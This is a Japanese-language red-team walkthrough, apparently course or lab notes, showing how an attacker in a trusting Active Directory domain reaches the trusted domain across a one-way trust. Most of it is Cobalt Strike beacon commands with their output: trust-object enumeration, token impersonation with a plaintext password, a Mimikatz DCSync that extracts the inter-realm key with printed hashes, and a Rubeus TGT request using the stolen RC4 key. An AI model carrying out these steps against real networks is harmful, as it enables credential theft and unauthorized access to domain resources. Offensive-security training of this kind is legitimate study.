one-way trustでTrusting Domainに攻撃者がいるときの話


TDO を照会すると、contoso.com との一方向トラストのアウトバウンド側にいることがわかる。
```
beacon> getuid
[*] You are PARTNER\vwebber

beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 2
trustAttributes: 8
flatName: CONTOSO
```

foreign domainを列挙しようとするとerror code 49
```
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com
[-] Bind Failed: 49
```

Trusted Domain内のプリンシパルのクレデンシャルを持っていれば、そのユーザに成りすましてTrustedDomainのリソースにアクセス可能
```
beacon> make_token CONTOSO\Administrator Passw0rd!
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> ls \\lon-dc-1.contoso.com\c$

 Size     Type    Last Modified         Name
          dir     ...                   Windows
          dir     ...                   Users
 ...
```

Trusted Domainのユーザのクレデンシャルを手に入れる方法
Trust AccountはTrusted Domain内でflat nameを持ったものが作成される。パスワードはinter-realm key

inter-realm keyを取得するためにTDOの`objectGUID`属性を取得
```
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

--------------------
name: contoso.com
objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
```

Mimikatzの`/guid`パラメータでDCSyncする
```
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

[DC] 'partner.com' will be the domain
[DC] 'par-dc-1.partner.com' will be the DC server
[DC] Object with GUID '{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}'

** TRUSTED DOMAIN - Antisocial **

Partner : contoso.com
 [ Out ] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR - cb 87 71 2c ...
    * aes256_hmac  cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
    * aes128_hmac  4929a44176077b570d1b6f1eae4f9fbb
    * rc4_hmac_nt  6150491cceb080dffeaaec5e60d8f58d

 [Out-1] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR - cb 87 71 2c ...
    * aes256_hmac  cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
    * aes128_hmac  4929a44176077b570d1b6f1eae4f9fbb
    * rc4_hmac_nt  6150491cceb080dffeaaec5e60d8f58d
```

`Out]` と `[Out-1]` はそれぞれ「現在」と「一つ前」のキーを表す
RC4 キーを使って、トラステッドドメインから TGT を要求
```
beacon> execute-assembly Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Ask TGT

[+] TGT request successful!

  ServiceName  : krbtgt/CONTOSO.COM
  ServiceRealm : CONTOSO.COM
  UserName     : PARTNER$ (NT_PRINCIPAL)
  UserRealm    : CONTOSO.COM
  ...
  KeyType      : rc4_hmac
```

チケットをログオンセッションにインジェクトすれば、Trusted Domainを列挙可能
```
ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
```